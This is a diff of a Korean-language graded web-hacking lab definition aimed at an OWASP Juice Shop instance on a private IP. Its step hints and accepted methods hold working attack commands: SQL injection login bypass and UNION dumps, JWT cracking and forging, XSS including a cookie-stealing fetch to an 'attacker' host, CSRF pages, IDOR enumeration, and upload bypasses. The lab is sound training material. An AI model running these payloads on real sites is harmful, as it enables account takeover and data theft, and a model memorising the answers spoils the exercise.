@@ -16,7 +16,22 @@ steps:
 - order: 1
   instruction: JuiceShop 로그인 페이지(/rest/user/login)에 SQL Injection을 시도하라. email에 '
     OR 1=1-- 페이로드를 사용하여 관리자로 로그인하라.
-  hint: POST 요청의 email 필드에 SQL Injection 페이로드를 넣는다
+  hint: |
+    POST 요청의 email 필드에 SQL Injection 페이로드를 넣는다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선 사용: curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{"email":"'"'"' OR 1=1--","password":"a"}' | python3 -m json.tool
+    2) 미설치 시: sudo apt install -y curl python3
+    3) 실패/대안 (SQLi 자동화):
+       - sqlmap -u "http://10.20.30.80:3000/rest/user/login" --data='{"email":"x","password":"y"}' --headers="Content-Type: application/json" --batch --level 5 --risk 3 (가장 정밀)
+       - sqlmap --dbms sqlite (DB 명시 — JuiceShop 은 SQLite)
+       - Burp Repeater + SQLi cheat sheet (수동 페이로드)
+       - http POST + httpie (sudo apt install -y httpie)
+       - Python requests + json
+       - PayloadAllTheThings/SQLi/Auth_Bypass.md (페이로드 모음)
+       - Ghauri (modern SQLi automation)
+    4) 추가 페이로드: '"' OR 'a'='a"' / "admin'--" / "' UNION SELECT NULL--".
+    5) 검증: token 키 (JWT 반환) → 인증 우회 성공. CWE-89 + OWASP A03.
   category: exploit
   points: 10
   answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl\
@@ -36,9 +51,15 @@ steps:
       - email='OR 1=1-- 페이로드
       - POST /rest/user/login
       acceptable_methods:
-      - curl + OR 1=1--
-      - sqlmap -u /login --data --dbms sqlite
-      - Burp Repeater SQL 페이로드
+      - "curl + OR 1=1-- (수기 baseline): JSON body 에 SQLi. token 반환 = 우회 성공."
+      - "sqlmap --data + --dbms sqlite: 자동화 + DB 명시."
+      - "sqlmap --level 5 --risk 3: 가장 정밀 (false positive 우려)."
+      - "Burp Repeater + cheat sheet: 수동 페이로드."
+      - "httpie POST: modern."
+      - "Python requests: 자동화."
+      - "PayloadAllTheThings: 페이로드 모음."
+      - "Ghauri: GitHub modern SQLi."
+      - "추가 페이로드 시도: admin'-- / ' UNION SELECT NULL-- / ' OR 'a'='a."
       negative_signs:
       - OR 1=1 페이로드 없음
       - 주석(--) 없음
@@ -46,7 +67,22 @@ steps:
   target_vm: attacker
 - order: 2
   instruction: 획득한 JWT 토큰을 디코딩하여 관리자 계정의 이메일과 역할을 확인하라.
-  hint: JWT는 Base64로 인코딩된 3부분으로 구성된다. python3으로 디코딩할 수 있다
+  hint: |
+    JWT는 Base64로 인코딩된 3부분으로 구성된다. python3으로 디코딩할 수 있다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선 사용: python3 -c "import sys,json,base64; t='<JWT>'; p=t.split('.')[1]; p+='='*(-len(p)%4); print(json.loads(base64.urlsafe_b64decode(p)))"
+    2) 미설치 시: sudo apt install -y python3 (대부분 기본)
+    3) 실패/대안 (JWT 디코딩 도구별):
+       - jwt.io (web, 시각, 가장 편함)
+       - echo "<payload>" | base64 -d (간단, padding 수동)
+       - jq -R 'split(".") | .[1] | @base64d | fromjson' (jq, oneline)
+       - PyJWT: python3 -c "import jwt; print(jwt.decode('<JWT>', options={'verify_signature': False}))"
+       - jwt-cracker (key brute force, GitHub)
+       - jwt_tool.py (offline analyzer + attack, GitHub ticarpi/jwt_tool)
+       - hashcat -m 16500 jwt.txt wordlist.txt (HMAC key crack)
+    4) 후속: header (alg/typ) + payload (exp/iat/sub/role) 분석 → 변조 시도 (alg=none).
+    5) 검증: email/role 필드 추출. role:admin 확인.
   category: analysis
   points: 10
   answer: "curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type:\
@@ -68,10 +104,15 @@ steps:
       - JWT split '.' + base64 디코딩
       - payload 추출
       acceptable_methods:
-      - python base64 디코딩
-      - jwt.io 웹
-      - jq + base64 -d
-      - PyJWT decode
+      - "python3 base64 (수기 baseline): split('.') + padding + urlsafe_b64decode → email/role."
+      - "jwt.io web: 시각, 편함."
+      - "echo + base64 -d: 간단."
+      - "jq -R split: oneline."
+      - "PyJWT decode: verify_signature=False."
+      - "jwt_tool.py: offline analyzer + attack."
+      - "jwt-cracker: key brute."
+      - "hashcat -m 16500: HMAC key crack."
+      - "Burp JWT Editor extension: 시각 + 변조 + 서명."
       negative_signs:
       - base64 디코딩 없음
       - JWT 구조 (header.payload.signature) 맥락 없음
@@ -80,7 +121,23 @@ steps:
 - order: 3
   instruction: JuiceShop의 검색 기능(/rest/products/search?q=)에 XSS 페이로드를 삽입하라. <iframe
     src='javascript:alert(1)'> 페이로드를 사용하라.
-  hint: 검색 쿼리에 HTML/JavaScript 코드를 삽입한다
+  hint: |
+    검색 쿼리에 HTML/JavaScript 코드를 삽입한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선 사용: curl -s 'http://10.20.30.80:3000/rest/products/search?q=<iframe%20src%3D%22javascript:alert(1)%22>'
+    2) 미설치 시: sudo apt install -y curl
+    3) 실패/대안 (XSS 자동화):
+       - dalfox url http://10.20.30.80:3000/rest/products/search?q= --silence (Go, fast)
+       - xsser -u "http://10.20.30.80:3000/rest/products/search?q=XSS" (legacy)
+       - kxss (URL parameter reflection 탐지)
+       - Burp Pro Active Scan XSS
+       - OWASP ZAP Active Scan XSS
+       - PayloadAllTheThings/XSS Injection.md (페이로드 모음)
+       - XSS Hunter (외부 callback, payload list)
+    4) 페이로드 변형: <script>/<svg onload=>/<img src=x onerror=>/<iframe src=javascript:>/<a href=javascript:>.
+    5) URL 인코딩: %3C=< %3E=> %22=" %27=' %20= space.
+    6) 검증: 응답에 페이로드 그대로 반영 → CWE-79 + OWASP A03.
   category: exploit
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
@@ -101,9 +158,15 @@ steps:
       - URL 인코딩 XSS 페이로드 + search?q=
       - 'javascript: URI'
       acceptable_methods:
-      - curl + URL 인코딩 XSS
-      - XSSer/DalFox
-      - Burp Intruder XSS 리스트
+      - "curl + URL 인코딩 XSS (수기 baseline): %3Ciframe + javascript: URI. 응답 반영 = Reflected XSS."
+      - "DalFox: Go fast, 자동 XSS."
+      - "XSSer: legacy."
+      - "kxss: 반영 탐지."
+      - "Burp Pro Active Scan."
+      - "OWASP ZAP Active Scan."
+      - "PayloadAllTheThings XSS: 페이로드 모음."
+      - "XSS Hunter: callback."
+      - "DOMPurify bypass DB (XSS payload mutations)."
       negative_signs:
       - iframe/script 페이로드 없음
       - URL 인코딩 없음
@@ -112,7 +175,21 @@ steps:
 - order: 4
   instruction: JuiceShop의 사용자 등록 API(/api/Users)를 사용하여 role을 admin으로 설정한 사용자를 등록하라.
     Mass Assignment 취약점을 공략하라.
-  hint: 등록 요청에 role 필드를 추가하여 전송하라
+  hint: |
+    등록 요청에 role 필드를 추가하여 전송하라.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선 사용: curl -s -X POST http://10.20.30.80:3000/api/Users -H 'Content-Type: application/json' -d '{"email":"hacker@test.com","password":"hacker123","passwordRepeat":"hacker123","role":"admin","securityQuestion":{"id":1,"question":"test"},"securityAnswer":"test"}' | python3 -m json.tool
+    2) 미설치 시: sudo apt install -y curl python3
+    3) 실패/대안:
+       - http POST + JSON (httpie)
+       - Python requests + json.dumps
+       - Burp Repeater + 필드 주입 (수동 추가/제거)
+       - Postman + body 조작
+       - Arjun (HTTP parameter discovery → 숨겨진 필드 발견)
+       - Param Miner (Burp extension)
+    4) 추가 필드 시도: isAdmin, is_admin, admin, role:[admin,user], permissions:[*].
+    5) 검증: email 필드 + role:admin 응답 → Mass Assignment 성공. CWE-915 + OWASP A01.
   category: exploit
   points: 10
   answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl\
@@ -137,9 +214,15 @@ steps:
       - role:admin 필드 포함 POST
       - /api/Users 등록
       acceptable_methods:
-      - curl + role 필드 추가
-      - Burp Repeater + 필드 주입
-      - Postman + JSON 조작
+      - "curl + role:admin (수기 baseline): JSON 등록. role 직접 지정 → 관리자 계정."
+      - "httpie POST: modern."
+      - "Python requests: 자동화."
+      - "Burp Repeater: 수동 + 필드 주입."
+      - "Postman: GUI."
+      - "Arjun: 파라미터 자동 발견."
+      - "Param Miner (Burp extension): 숨겨진 필드 brute."
+      - "추가 필드: isAdmin/is_admin/admin/permissions."
+      - "Bastion AI Mass Assignment 자동: bastion 이 모든 필드 brute → 권한 상승 finding."
       negative_signs:
       - role:admin 필드 없음
       - Mass Assignment 맥락 없음
@@ -148,7 +231,22 @@ steps:
 - order: 5
   instruction: JuiceShop의 /rest/products/search?q= 엔드포인트에 UNION 기반 SQL Injection을
     시도하여 데이터베이스 테이블 정보를 추출하라.
-  hint: UNION SELECT와 sqlite_master를 활용하라
+  hint: |
+    UNION SELECT와 sqlite_master를 활용하라.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27%29%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--'
+    2) 미설치 시: sudo apt install -y curl
+    3) 실패/대안 (UNION SQLi 단계별):
+       - sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=" --dbs --tables -T users --columns --dump (자동 dump)
+       - sqlmap --technique=U (UNION 만)
+       - sqlmap --batch -p q (q 파라미터 명시)
+       - 컬럼 개수 fuzz: ' ORDER BY 1-- → 2-- → ... 까지 에러 시 컬럼 수
+       - NULL 매칭: ' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+       - PayloadAllTheThings/SQLi/PayloadsAllTheThings.md
+       - Burp Repeater + 컬럼 fuzz
+    4) DB schema: SQLite → sqlite_master. MySQL → information_schema. PostgreSQL → pg_tables.
+    5) 검증: SELECT 키워드 + 테이블/컬럼 명 추출.
   category: exploit
   points: 15
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
@@ -168,9 +266,15 @@ steps:
       - UNION SELECT + sqlite_master
       - URL 인코딩 페이로드
       acceptable_methods:
-      - curl + UNION SELECT
-      - sqlmap --dbs -T sqlite_master
-      - Burp + 컬럼 개수 fuzz
+      - "curl + UNION SELECT (수기 baseline): sqlite_master 9 컬럼. 테이블 구조 추출."
+      - "sqlmap --technique=U: UNION 만."
+      - "sqlmap --dbs --dump: 자동 dump."
+      - "ORDER BY 컬럼 fuzz: 개수 추정."
+      - "NULL 매칭: 컬럼 일치 확인."
+      - "Burp Repeater + 컬럼 fuzz."
+      - "PayloadAllTheThings UNION."
+      - "Ghauri (modern)."
+      - "DB별 schema: SQLite=sqlite_master, MySQL=information_schema, PostgreSQL=pg_tables."
       negative_signs:
       - UNION SELECT 없음
       - sqlite_master 또는 information_schema 맥락 없음
@@ -178,7 +282,21 @@ steps:
 - order: 6
   instruction: JuiceShop의 고객 피드백(/api/Feedbacks)에 Stored XSS 페이로드를 삽입하라. comment 필드에
     <script>alert('XSS')</script>를 포함하라.
-  hint: POST 요청으로 피드백을 제출하며, 관리자 토큰이 필요할 수 있다
+  hint: |
+    POST 요청으로 피드백을 제출하며, 관리자 토큰이 필요할 수 있다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: TOKEN=$(curl ...login...) 후 curl -X POST /api/Feedbacks -H "Authorization: Bearer $TOKEN" -d '{"comment":"<script>alert(1)</script>","rating":1}'
+    2) 미설치 시: sudo apt install -y curl python3
+    3) 실패/대안:
+       - DalFox stored: dalfox url ... -b XSS_Hunter (callback)
+       - Burp Repeater + Stored XSS payload
+       - PayloadAllTheThings/XSS/Stored.md
+       - XSS Hunter (외부 callback, payload 자동 trigger 시 알림)
+       - BeEF (Browser Exploitation Framework, hooked 후 module 실행)
+       - 자동화: Python requests + token 획득 + POST chain
+    4) 페이로드 변형: <script>fetch('http://attacker/c?'+document.cookie)</script> (쿠키 탈취), <svg onload=...>, <img src=x onerror=>.
+    5) 검증: comment 필드 + script 페이로드 그대로 저장 → 다른 사용자 (관리자) 페이지 view 시 실행.
   category: exploit
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
@@ -205,9 +323,15 @@ steps:
       - TOKEN=$(curl login ...) + POST /api/Feedbacks
       - <script> 페이로드
       acceptable_methods:
-      - TOKEN 획득 후 POST
-      - Burp Repeater + stored XSS
-      - 자동화 Postman
+      - "curl + TOKEN + POST (수기 baseline): 로그인 → token → /api/Feedbacks <script> 저장."
+      - "DalFox stored + XSS Hunter callback."
+      - "Burp Repeater stored XSS."
+      - "Postman: collection."
+      - "Python requests chain."
+      - "BeEF (hooked browser)."
+      - "PayloadAllTheThings Stored.md."
+      - "XSS Hunter: callback."
+      - "쿠키 탈취 페이로드: <script>fetch('attacker?'+document.cookie)</script>."
       negative_signs:
       - TOKEN 획득 단계 없음
       - <script> 페이로드 없음
@@ -216,7 +340,21 @@ steps:
 - order: 7
   instruction: JuiceShop의 /ftp 디렉토리에서 Null Byte Injection을 사용하여 접근이 제한된 파일을 다운로드하라.
     package.json.bak 파일을 시도하라.
-  hint: URL에 %2500(이중 인코딩된 Null Byte)을 사용하라
+  hint: |
+    URL에 %2500(이중 인코딩된 Null Byte)을 사용하라.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: curl -s 'http://10.20.30.80:3000/ftp/package.json.bak%2500.md'
+    2) 미설치 시: sudo apt install -y curl
+    3) 실패/대안:
+       - %00 (단일 인코딩, 일부 서버는 자동 디코딩)
+       - %2500 (이중 인코딩, URL 디코딩 후 Null Byte)
+       - %252500 (삼중)
+       - Burp Repeater + Null Byte 변형
+       - wfuzz -z list,%00-%2500-%252500 -u URL
+       - PayloadAllTheThings/File Inclusion/README.md (Null Byte 섹션)
+       - bash 직접: printf "GET /ftp/file.bak\\x00.md HTTP/1.1\\r\\n..." | nc 10.20.30.80 3000
+    4) 검증: package.json 내용 노출 → 확장자 검증 우회 (CWE-158).
   category: exploit
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
@@ -236,9 +374,15 @@ steps:
       - '%2500 (이중 인코딩 Null Byte)'
       - package.json.bak 접근
       acceptable_methods:
-      - curl + %2500
-      - Burp Repeater + Null Byte
-      - wfuzz Null Byte fuzzer
+      - "curl + %2500 (수기 baseline): 이중 인코딩 Null Byte. 확장자 검증 우회."
+      - "%00 (단일 인코딩): 일부 서버 디코딩."
+      - "%252500 (삼중): 다층 디코딩 환경."
+      - "Burp Repeater + 변형 (00/%00/%2500/%252500)."
+      - "wfuzz Null Byte fuzzer."
+      - "PayloadAllTheThings File Inclusion."
+      - "ffuf encoded payloads."
+      - "bash + nc raw: printf '\\x00' 직접."
+      - "Python urllib: 자동화."
       negative_signs:
       - '%2500/%00 없음'
       - Null Byte 맥락 없음
@@ -246,7 +390,21 @@ steps:
   target_vm: attacker
 - order: 8
   instruction: JuiceShop에서 0-star 리뷰를 제출하라. rating 값을 0으로 설정하여 입력 검증 우회를 시도하라.
-  hint: API 직접 호출로 클라이언트 측 검증을 우회한다
+  hint: |
+    API 직접 호출로 클라이언트 측 검증을 우회한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: TOKEN=$(curl ...login...) 후 curl -X POST /api/Feedbacks -d '{"comment":"Zero star","rating":0}'
+    2) 미설치 시: sudo apt install -y curl python3
+    3) 실패/대안 (검증 우회):
+       - rating 값 변형: 0, -1, 999, 1.5, "abc", null (각 type 검증 우회)
+       - Burp Proxy (브라우저 트래픽 가로채기 + 수정)
+       - Burp Repeater (수동 변조)
+       - Postman + JSON body 직접 편집
+       - ZAP Proxy + Manual Request Editor
+       - Python requests + json.dumps (자동화)
+       - mitmproxy (transparent proxy)
+    4) 검증: rating:0 저장 성공 → 클라이언트 검증 무력. 서버 검증 부재 = OWASP A04 Insecure Design.
   category: exploit
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
@@ -271,9 +429,15 @@ steps:
       - TOKEN + POST /api/Feedbacks
       - rating:0 페이로드
       acceptable_methods:
-      - curl + rating:0
-      - Postman + 직접 API
-      - Burp Repeater
+      - "curl + rating:0 (수기 baseline): API 직접 호출 → HTML5 min=1 우회."
+      - "변형 시도: -1, 999, 1.5, abc, null."
+      - "Burp Proxy + 수정: 트래픽 변조."
+      - "Burp Repeater: manual."
+      - "Postman: GUI."
+      - "ZAP Manual Request: 무료."
+      - "Python requests: 자동화."
+      - "mitmproxy: transparent."
+      - "type confusion: integer/string/object (JSON Schema 부재)."
       negative_signs:
       - rating:0 없음
       - 클라이언트 검증 우회 맥락 없음
@@ -282,7 +446,21 @@ steps:
 - order: 9
   instruction: JuiceShop의 /rest/user/change-password 엔드포인트에서 CSRF 취약점을 확인하라. GET 요청으로
     비밀번호를 변경할 수 있는지 테스트하라.
-  hint: GET 파라미터로 current, new, repeat을 전달한다
+  hint: |
+    GET 파라미터로 current, new, repeat을 전달한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: TOKEN=$(curl ...login...) 후 curl 'http://10.20.30.80:3000/rest/user/change-password?current=a&new=newpass123&repeat=newpass123' -H "Authorization: Bearer $TOKEN"
+    2) 미설치 시: sudo apt install -y curl python3
+    3) 실패/대안 (CSRF PoC 작성):
+       - HTML PoC: <html><body><img src="http://10.20.30.80:3000/rest/user/change-password?current=a&new=hacked&repeat=hacked"></body></html>
+       - <iframe src="..."></iframe> (자동 GET)
+       - <form action="..." method="POST"> (POST CSRF, 자동 submit JavaScript)
+       - Burp Pro CSRF PoC generator (Engagement Tools)
+       - csrfgenerator.com (online)
+       - Python requests + Cookie 조작
+    4) 방어 검증: Referer 헤더 / SameSite cookie / CSRF token / Origin 헤더.
+    5) 검증: password 변경 응답 → CWE-352 + OWASP A01.
   category: exploit
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
@@ -306,9 +484,15 @@ steps:
       - GET + current/new/repeat 쿼리 파라미터
       - Cookie:token 전송
       acceptable_methods:
-      - curl GET + 쿼리
-      - CSRF PoC 페이지
-      - Burp CSRF PoC generator
+      - "curl GET + 쿼리 (수기 baseline): GET 으로 비밀번호 변경 → CSRF 매우 취약."
+      - "HTML <img src=>: 자동 GET trigger."
+      - "<iframe src>: 자동 로드."
+      - "<form auto-submit>: POST CSRF."
+      - "Burp Pro CSRF PoC generator."
+      - "csrfgenerator.com: online."
+      - "Python requests + Cookie."
+      - "방어: Referer/SameSite/CSRF token/Origin."
+      - "Bastion AI CSRF detection: 모든 GET 상태변경 endpoint 자동 finding."
       negative_signs:
       - GET 방식 아님
       - CSRF 맥락 없음
@@ -316,7 +500,21 @@ steps:
   target_vm: attacker
 - order: 10
   instruction: JuiceShop의 /rest/basket/1 엔드포인트에 접근하여 다른 사용자의 장바구니 내용을 조회하라(IDOR 취약점).
-  hint: 다른 사용자의 basket ID를 직접 지정하여 접근한다
+  hint: |
+    다른 사용자의 basket ID를 직접 지정하여 접근한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: TOKEN=$(...) 후 curl http://10.20.30.80:3000/rest/basket/2 -H "Authorization: Bearer $TOKEN"
+    2) 미설치 시: sudo apt install -y curl python3
+    3) 실패/대안 (IDOR enum 자동화):
+       - Burp Intruder Pitchfork (ID 1-100 자동, 응답 길이/code 차이)
+       - ffuf -u http://10.20.30.80:3000/rest/basket/FUZZ -w numbers.txt -mc 200
+       - Burp Autorize extension (자동 권한 우회 검사 — 다른 사용자 토큰으로 같은 endpoint 접근)
+       - Postman Runner + ID iteration
+       - Python requests + range(1, 100)
+       - Arjun (parameter discovery → 숨겨진 ID 필드)
+       - katana endpoint discovery
+    4) 검증: 다른 user 의 Products/items 데이터 노출 → CWE-639 + OWASP A01.
   category: exploit
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
@@ -341,9 +539,15 @@ steps:
       - /rest/basket/2 (ID 변경)
       - TOKEN 포함 요청
       acceptable_methods:
-      - curl + ID 변경
-      - Burp Intruder IDOR fuzz
-      - Autorize extension
+      - "curl + ID 변경 (수기 baseline): /rest/basket/2 → 다른 user 데이터."
+      - "Burp Intruder Pitchfork: ID 1-N 자동."
+      - "ffuf -mc 200: numbers.txt fuzz."
+      - "Burp Autorize: 자동 권한 우회."
+      - "Postman Runner: ID iteration."
+      - "Python requests range: 자동화."
+      - "Arjun: parameter discovery."
+      - "katana endpoint."
+      - "Bastion AI IDOR detection: cross-user 데이터 접근 자동 finding."
       negative_signs:
       - ID 변경 없음
       - IDOR 맥락 없음
@@ -351,7 +555,20 @@ steps:
   target_vm: attacker
 - order: 11
   instruction: JuiceShop의 /api/Products/1 엔드포인트에 PUT 요청을 보내 제품 정보를 무단으로 수정하라.
-  hint: PUT 요청으로 제품의 description을 변경한다
+  hint: |
+    PUT 요청으로 제품의 description을 변경한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: TOKEN=$(...) 후 curl -X PUT /api/Products/1 -H "Authorization: Bearer $TOKEN" -d '{"description":"Hacked"}'
+    2) 미설치 시: sudo apt install -y curl python3
+    3) 실패/대안 (HTTP method 우회):
+       - X-HTTP-Method-Override: PUT 헤더 (POST 만 허용 환경 우회)
+       - X-HTTP-Method 헤더
+       - _method=PUT body 파라미터
+       - Burp Repeater + Method 변경 (GET/POST/PUT/DELETE/PATCH/HEAD/OPTIONS)
+       - HTTP Method Fuzzer (Python/Go)
+       - sudo nmap --script http-methods -p 3000 (허용 메소드 enum)
+    4) 검증: description 필드 변경 응답 → 일반 사용자 PUT = OWASP A01 Broken Access Control.
   category: exploit
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
@@ -377,9 +594,15 @@ steps:
       - PUT 메서드 + /api/Products/1
       - description 변경
       acceptable_methods:
-      - curl -X PUT
-      - Burp Repeater 메서드 변경
-      - Postman PUT
+      - "curl -X PUT (수기 baseline): 일반 사용자 PUT. description 변경 → A01."
+      - "X-HTTP-Method-Override 헤더: POST 환경 우회."
+      - "_method=PUT body."
+      - "Burp Repeater + Method 변경."
+      - "HTTP Method Fuzzer."
+      - "nmap --script http-methods: 허용 method enum."
+      - "Postman PUT."
+      - "Python requests.put."
+      - "Bastion AI HTTP method audit: 모든 endpoint 의 method matrix 자동."
       negative_signs:
       - PUT 메서드 없음
       - Broken Access Control 맥락 없음
@@ -387,7 +610,21 @@ steps:
   target_vm: attacker
 - order: 12
   instruction: JuiceShop의 /profile 이미지 업로드 기능에서 파일 타입 검증을 우회하여 SVG 파일(XSS 포함)을 업로드하라.
-  hint: SVG 파일은 XML 기반이므로 JavaScript를 포함할 수 있다
+  hint: |
+    SVG 파일은 XML 기반이므로 JavaScript를 포함할 수 있다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: echo '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><text>XSS</text></svg>' > /tmp/xss.svg && curl -X POST /profile/image/file -F 'file=@/tmp/xss.svg;type=image/svg+xml'
+    2) 미설치 시: sudo apt install -y curl
+    3) 실패/대안 (파일 업로드 우회):
+       - .png 확장자 위장: mv xss.svg xss.png + Content-Type 그대로
+       - magic byte 위장: GIF89a;<svg ...> (앞에 GIF magic 추가)
+       - Polyglot 파일: GIF + JS (eligrey/canvas-toBlob)
+       - Burp Repeater + 멀티파트 변조 (filename / Content-Type / body)
+       - PayloadAllTheThings/Upload Insecure Files (페이로드 모음)
+       - exiftool 로 EXIF 에 페이로드 삽입
+       - HTML / XHTML / SVG 다른 XSS vector
+    4) 검증: SVG 업로드 성공 → onload trigger.
   category: exploit
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
@@ -413,9 +650,15 @@ steps:
       - onload 이벤트 포함 SVG
       - image/svg+xml MIME 타입
       acceptable_methods:
-      - curl -F 파일 업로드
-      - Burp Repeater 멀티파트
-      - Upload burp 확장
+      - "curl -F 파일 업로드 (수기 baseline): SVG + onload. MIME 타입 svg+xml."
+      - "확장자 위장 (.png + Content-Type 변조)."
+      - "magic byte 위장 (GIF89a polyglot)."
+      - "Polyglot 파일 (GIF + JS)."
+      - "Burp Repeater 멀티파트 변조."
+      - "PayloadAllTheThings Upload."
+      - "exiftool EXIF 페이로드."
+      - "wfuzz / ffuf 파일 업로드."
+      - "Bastion AI 자동 업로드 + 검증: 다양한 file type / MIME 자동."
       negative_signs:
       - SVG 파일 없음
       - onload 없음
@@ -424,7 +667,22 @@ steps:
 - order: 13
   instruction: JuiceShop의 /rest/saveLoginIp 엔드포인트를 이용하여 HTTP 헤더 인젝션을 시도하라. X-Forwarded-For
     헤더에 XSS 페이로드를 삽입하라.
-  hint: True-Client-IP 또는 X-Forwarded-For 헤더를 조작한다
+  hint: |
+    True-Client-IP 또는 X-Forwarded-For 헤더를 조작한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: TOKEN=$(...) 후 curl /rest/saveLoginIp -H 'True-Client-IP: <script>alert(1)</script>'
+    2) 미설치 시: sudo apt install -y curl
+    3) 실패/대안 (헤더 인젝션 도구):
+       - curl -H 'X-Forwarded-For: <script>'
+       - curl -H 'X-Real-IP: payload'
+       - curl -H 'Forwarded: for=payload'
+       - Burp Match and Replace (모든 요청 헤더 자동 추가)
+       - Burp Repeater + 헤더 수동 변조
+       - hackbar (브라우저 확장)
+       - PayloadAllTheThings/Headers (헤더 인젝션 모음)
+       - python requests headers={...}
+    4) 검증: script 페이로드 응답 저장 → Stored XSS via Header. CWE-79 + CWE-113.
   category: exploit
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
@@ -449,9 +707,15 @@ steps:
       - True-Client-IP 헤더 + <script>
       - saveLoginIp 엔드포인트
       acceptable_methods:
-      - curl -H 커스텀 헤더
-      - Burp Repeater 헤더 조작
-      - hackbar 유사
+      - "curl -H True-Client-IP (수기 baseline): 헤더 + script. saveLoginIp 저장."
+      - "X-Forwarded-For / X-Real-IP / Forwarded."
+      - "Burp Match and Replace: 자동."
+      - "Burp Repeater: manual."
+      - "hackbar: 브라우저."
+      - "PayloadAllTheThings Headers."
+      - "Python requests headers."
+      - "Postman: GUI."
+      - "헤더 종류: User-Agent/Referer/X-* (모두 클라이언트 신뢰 불가)."
       negative_signs:
       - 커스텀 헤더 조작 없음
       - X-Forwarded-For/True-Client-IP 맥락 없음
@@ -460,7 +724,21 @@ steps:
 - order: 14
   instruction: JuiceShop의 관리자 패널(/administration)에 접근하라. 일반 사용자로 로그인한 상태에서 직접 URL을
     입력하여 접근 가능한지 확인하라.
-  hint: 프론트엔드 라우팅만으로 접근을 제한하는 경우 URL 직접 입력으로 우회할 수 있다
+  hint: |
+    프론트엔드 라우팅만으로 접근을 제한하는 경우 URL 직접 입력으로 우회할 수 있다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: TOKEN=$(...) 후 curl http://10.20.30.80:3000/administration -H "Authorization: Bearer $TOKEN"
+    2) 미설치 시: sudo apt install -y curl
+    3) 실패/대안 (관리자 패널 enum):
+       - 브라우저 URL 직접 입력 (Angular/React 라우트 우회)
+       - 일반 사용자 토큰 + curl 직접 호출 (백엔드 인가 검증 부재 확인)
+       - JWT 변조: header alg=none / role=admin payload 변조 후 재서명
+       - Burp Repeater + Authorization 헤더 변조
+       - Burp Autorize: 자동 권한 우회 검사
+       - ffuf admin endpoint enum: /admin /administration /panel /dashboard
+       - dirsearch + admin wordlist
+    4) 검증: html 응답 + 관리자 UI 컨텐츠 → 백엔드 인가 부재 = OWASP A01.
   category: exploit
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
@@ -485,9 +763,15 @@ steps:
       - /administration + TOKEN
       - 백엔드 인가 부재
       acceptable_methods:
-      - curl + 직접 URL
-      - 브라우저 URL 수동 입력
-      - Autorize Burp 확장
+      - "curl + 직접 URL (수기 baseline): /administration. 일반 사용자 토큰으로 접근."
+      - "브라우저 URL 직접: Angular/React 라우트 우회."
+      - "JWT 변조: alg=none / role=admin."
+      - "Burp Repeater + Auth 헤더."
+      - "Burp Autorize: 자동 권한 우회."
+      - "ffuf admin endpoint."
+      - "dirsearch + admin wordlist."
+      - "Postman: GUI."
+      - "Bastion AI 자동 admin enum + 인가 검사."
       negative_signs:
       - /administration 없음
       - 프론트 라우팅 맥락 없음
@@ -495,7 +779,23 @@ steps:
   target_vm: attacker
 - order: 15
   instruction: 수행한 모든 웹 공격을 OWASP Top 10 카테고리별로 분류하여 /tmp/web_attack_report.txt에 정리하라.
-  hint: 각 공격이 해당하는 OWASP 카테고리를 매핑하라
+  hint: |
+    각 공격이 해당하는 OWASP 카테고리를 매핑하라.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: echo -e '...' > /tmp/web_attack_report.txt
+    2) 미설치 시: bash 기본
+    3) 실패/대안:
+       - heredoc cat > EOF
+       - markdown + pandoc → PDF (eisvogel)
+       - DefectDojo Engagement (web, OWASP 매핑 자동)
+       - Faraday IDE (collaborative)
+       - Dradis framework
+       - python3 + jinja2 template
+       - SARIF (CI/CD GitHub Code Scanning)
+    4) OWASP Top 10 (2021): A01 Access Control / A02 Crypto / A03 Injection / A04 Insecure Design / A05 Misconfiguration / A06 Outdated Components / A07 Auth Failure / A08 Integrity / A09 Logging / A10 SSRF.
+    5) MITRE ATT&CK: T1190/T1078/T1068/T1136/T1213.
+    6) 검증: 4 카테고리 + 수행한 공격 매핑.
   category: analysis
   points: 15
   answer: 'echo -e ''=== Web Attack Report ===\n\n[A01: Broken Access Control]\n-
@@ -520,9 +820,15 @@ steps:
       - A01/A03/A04/A05 카테고리
       - 수행한 공격 매핑
       acceptable_methods:
-      - echo > 보고서
